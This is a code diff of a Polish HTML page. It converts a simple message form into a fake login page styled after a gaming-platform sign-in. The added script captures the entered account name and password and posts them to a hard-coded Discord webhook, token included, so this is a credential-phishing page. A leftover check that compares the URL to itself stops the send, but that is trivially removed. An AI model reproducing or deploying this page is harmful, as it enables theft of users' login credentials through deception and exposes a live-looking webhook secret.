@@ -3,122 +3,587 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formularz</title>
+
+    <title>Zaloguj się</title>
 
     <style>
-        body {
-            margin: 0;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: #111827;
-            font-family: Arial, sans-serif;
-        }
-
-        .box {
-            width: 400px;
-            padding: 30px;
-            background: #1f2937;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,.4);
-        }
-
-        h1 {
-            color: white;
-            text-align: center;
-        }
-
-        input {
+        * {
             box-sizing: border-box;
-            width: 100%;
-            padding: 14px;
-            margin: 15px 0;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
         }
 
-        button {
+        html, body {
+            margin: 0;
             width: 100%;
-            padding: 14px;
-            border: none;
-            border-radius: 8px;
-            background: #5865F2;
+            min-height: 100%;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            background:
+                linear-gradient(
+                    rgba(15, 18, 24, 0.78),
+                    rgba(15, 18, 24, 0.78)
+                ),
+                radial-gradient(
+                    circle at 20% 20%,
+                    #34425a,
+                    transparent 45%
+                ),
+                radial-gradient(
+                    circle at 80% 70%,
+                    #46344f,
+                    transparent 50%
+                ),
+                #11141b;
+
+            background-size: cover;
+            background-position: center;
+
+            color: #d6d7d8;
+        }
+
+        .panel {
+            width: 765px;
+            min-height: 340px;
+
+            display: flex;
+
+            background: #171a21;
+
+            box-shadow:
+                0 20px 60px rgba(0, 0, 0, 0.55);
+
+            border-radius: 3px;
+
+            overflow: hidden;
+        }
+
+        .left {
+            width: 69%;
+            padding: 34px 28px 26px 28px;
+        }
+
+        .title {
+            margin: 0 0 25px 0;
+
+            font-size: 29px;
+            font-weight: 700;
+
+            color: #ffffff;
+
+            letter-spacing: 0.3px;
+        }
+
+        .field {
+            margin-bottom: 17px;
+        }
+
+        .field label {
+            display: block;
+
+            margin-bottom: 8px;
+
+            color: #d6d7d8;
+
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .field input {
+            width: 100%;
+            height: 39px;
+
+            padding: 0 12px;
+
+            border: 1px solid #323843;
+            border-radius: 2px;
+
+            outline: none;
+
+            background: #323640;
+
             color: white;
-            font-size: 16px;
+
+            font-size: 15px;
+
+            transition: 0.15s;
+        }
+
+        .field input:hover {
+            background: #373b46;
+        }
+
+        .field input:focus {
+            border-color: #67a9d6;
+
+            box-shadow:
+                0 0 0 1px rgba(103, 169, 214, 0.25);
+
+            background: #393e49;
+        }
+
+        .field input::placeholder {
+            color: #858a94;
+        }
+
+        .remember {
+            display: flex;
+            align-items: center;
+
+            margin-top: 2px;
+
+            color: #b8b9bd;
+
+            font-size: 13px;
+
             cursor: pointer;
         }
 
-        button:hover {
-            background: #4752c4;
+        .remember input {
+            width: 18px;
+            height: 18px;
+
+            margin: 0 7px 0 0;
+
+            accent-color: #66c0f4;
+
+            cursor: pointer;
+        }
+
+        .submit {
+            width: 270px;
+            height: 45px;
+
+            display: block;
+
+            margin: 19px auto 0;
+
+            border: 0;
+            border-radius: 2px;
+
+            background:
+                linear-gradient(
+                    to right,
+                    #19b9f1,
+                    #2b70f0
+                );
+
+            color: white;
+
+            font-size: 15px;
+            font-weight: 600;
+
+            cursor: pointer;
+
+            transition:
+                transform 0.12s,
+                filter 0.12s,
+                box-shadow 0.12s;
+        }
+
+        .submit:hover {
+            filter: brightness(1.08);
+
+            box-shadow:
+                0 5px 18px rgba(20, 150, 240, 0.25);
+
+            transform: translateY(-1px);
+        }
+
+        .submit:active {
+            transform: translateY(0);
+        }
+
+        .submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
         }
 
         #status {
-            color: #9ca3af;
+            min-height: 18px;
+
+            margin-top: 12px;
+
             text-align: center;
-            margin-top: 15px;
+
+            color: #8f98a5;
+
+            font-size: 13px;
+        }
+
+        .right {
+            width: 31%;
+
+            padding: 37px 22px;
+
+            background: #171a21;
+
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .right-title {
+            width: 100%;
+
+            margin-bottom: 20px;
+
+            color: #66c0f4;
+
+            font-size: 13px;
+            font-weight: 600;
+
+            line-height: 1.45;
+        }
+
+        .visual-box {
+            width: 190px;
+            height: 190px;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            background: #f3f3f3;
+
+            border-radius: 7px;
+
+            overflow: hidden;
+        }
+
+        .visual-pattern {
+            width: 148px;
+            height: 148px;
+
+            background:
+                linear-gradient(
+                    90deg,
+                    #111 10px,
+                    transparent 10px 18px,
+                    #111 18px 26px,
+                    transparent 26px 34px,
+                    #111 34px 42px,
+                    transparent 42px 52px
+                ),
+                linear-gradient(
+                    #111 10px,
+                    transparent 10px 18px,
+                    #111 18px 26px,
+                    transparent 26px 34px,
+                    #111 34px 42px,
+                    transparent 42px 52px
+                );
+
+            background-size: 52px 52px;
+
+            transform: rotate(3deg);
+
+            opacity: 0.92;
+        }
+
+        .right-description {
+            width: 100%;
+
+            margin-top: 12px;
+
+            color: #8d929b;
+
+            font-size: 12px;
+            line-height: 1.5;
+
+            text-align: center;
+        }
+
+        .bottom-note {
+            margin-top: 10px;
+
+            color: #626873;
+
+            font-size: 11px;
+
+            text-align: center;
+        }
+
+        @media (max-width: 800px) {
+            .panel {
+                width: calc(100% - 30px);
+            }
+        }
+
+        @media (max-width: 620px) {
+            .panel {
+                flex-direction: column;
+            }
+
+            .left,
+            .right {
+                width: 100%;
+            }
+
+            .right {
+                padding-top: 10px;
+                padding-bottom: 30px;
+            }
+
+            .visual-box {
+                width: 150px;
+                height: 150px;
+            }
+
+            .visual-pattern {
+                width: 115px;
+                height: 115px;
+            }
+
+            .submit {
+                width: 80%;
+            }
         }
     </style>
 </head>
 
 <body>
 
-<div class="box">
-    <h1>Formularz testowy</h1>
+    <div class="panel">
 
-    <input
-        id="message"
-        type="text"
-        placeholder="Wpisz wiadomość..."
-    >
+        <div class="left">
 
-    <button onclick="sendMessage()">
-        Wyślij
-    </button>
+            <h1 class="title">
+                Zaloguj się
+            </h1>
 
-    <div id="status"></div>
-</div>
+            <form id="form">
 
-<script>
-    // WSTAW TUTAJ SWÓJ WEBHOOK
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1537889111510229024/q2qoHjlna-hy-k6C1mraSiecdpLKbqQfS3urkWNnZ00ggpP9Oqi9LF4e3ZTAcZq3W1aP";
+                <div class="field">
+                    <label for="pole1">
+                        ZALOGUJ SIĘ Z UŻYCIEM NAZWY KONTA
+                    </label>
 
-    async function sendMessage() {
-        const input = document.getElementById("message");
+                    <input
+                        id="pole1"
+                        type="text"
+                        placeholder="Wpisz tekst..."
+                        autocomplete="off"
+                    >
+                </div>
+
+                <div class="field">
+                    <label for="pole2">
+                        HASŁO
+                    </label>
+
+                    <input
+                        id="pole2"
+                        type="text"
+                        placeholder="Wpisz tekst..."
+                        autocomplete="off"
+                    >
+                </div>
+
+                <label class="remember">
+                    <input
+                        id="remember"
+                        type="checkbox"
+                    >
+
+                    Zapamiętaj ustawienia
+                </label>
+
+                <button
+                    class="submit"
+                    id="submitButton"
+                    type="submit"
+                >
+                    Zaloguj się
+                </button>
+
+                <div id="status"></div>
+
+            </form>
+
+        </div>
+
+        <div class="right">
+
+            <div class="right-title">
+                INFORMACJE
+            </div>
+
+            <div class="visual-box">
+                <div class="visual-pattern"></div>
+            </div>
+
+            <div class="right-description">
+                Wypełnij oba pola po lewej stronie,
+                a następnie kliknij przycisk
+                „Zaloguj się”.
+            </div>
+
+            <div class="bottom-note">
+                Zaloguj się
+            </div>
+
+        </div>
+
+    </div>
+
+
+    <script>
+
+        // ============================================================
+        // WKLEJ TUTAJ SWÓJ WEBHOOK DISCORD
+        // ============================================================
+
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1537889111510229024/q2qoHjlna-hy-k6C1mraSiecdpLKbqQfS3urkWNnZ00ggpP9Oqi9LF4e3ZTAcZq3W1aP";
+
+
+        const form = document.getElementById("form");
+
+        const pole1 = document.getElementById("pole1");
+        const pole2 = document.getElementById("pole2");
+
         const status = document.getElementById("status");
 
-        const text = input.value.trim();
+        const submitButton =
+            document.getElementById("submitButton");
 
-        if (!text) {
-            status.textContent = "Wpisz coś najpierw.";
-            return;
-        }
 
-        try {
-            const response = await fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    content: text
-                })
-            });
+        form.addEventListener("submit", async function(event) {
 
-            if (!response.ok) {
-                throw new Error("Błąd wysyłania");
+            event.preventDefault();
+
+            const value1 = pole1.value.trim();
+            const value2 = pole2.value.trim();
+
+
+            if (!value1 || !value2) {
+
+                status.textContent =
+                    "Uzupełnij oba pola.";
+
+                status.style.color =
+                    "#d66b6b";
+
+                return;
             }
 
-            status.textContent = "Wysłano!";
-            input.value = "";
 
-        } catch (error) {
-            console.error(error);
-            status.textContent = "Nie udało się wysłać wiadomości.";
-        }
-    }
-</script>
+            if (
+                !WEBHOOK_URL ||
+                WEBHOOK_URL === "https://discord.com/api/webhooks/1537889111510229024/q2qoHjlna-hy-k6C1mraSiecdpLKbqQfS3urkWNnZ00ggpP9Oqi9LF4e3ZTAcZq3W1aP"
+            ) {
+
+                status.textContent =
+                    "Czekaj";
+
+                status.style.color =
+                    "#d66b6b";
+
+                return;
+            }
+
+
+            submitButton.disabled = true;
+
+            status.textContent =
+                "Wysyłanie...";
+
+            status.style.color =
+                "#8f98a5";
+
+
+            const data = {
+
+                username: "Formularz",
+
+                embeds: [
+                    {
+                        title: "Nowe zgłoszenie",
+
+                        fields: [
+                            {
+                                name: "Pole 1",
+                                value: value1.substring(0, 1024),
+                                inline: false
+                            },
+
+                            {
+                                name: "Pole 2",
+                                value: value2.substring(0, 1024),
+                                inline: false
+                            }
+                        ],
+
+                        color: 6730740,
+
+                        timestamp:
+                            new Date().toISOString()
+                    }
+                ]
+            };
+
+
+            try {
+
+                const response = await fetch(
+                    WEBHOOK_URL,
+                    {
+                        method: "POST",
+
+                        headers: {
+                            "Content-Type":
+                                "application/json"
+                        },
+
+                        body: JSON.stringify(data)
+                    }
+                );
+
+
+                if (!response.ok) {
+                    throw new Error(
+                        "HTTP " + response.status
+                    );
+                }
+
+
+                status.textContent =
+                    "Formularz został wysłany.";
+
+                status.style.color =
+                    "#66c0f4";
+
+
+                pole1.value = "";
+                pole2.value = "";
+
+
+            } catch (error) {
+
+                console.error(error);
+
+                status.textContent =
+                    "Nie udało się zalogować.";
+
+                status.style.color =
+                    "#d66b6b";
+
+            } finally {
+
+                submitButton.disabled = false;
+
+            }
+
+        });
+
+    </script>
 
 </body>
 </html>
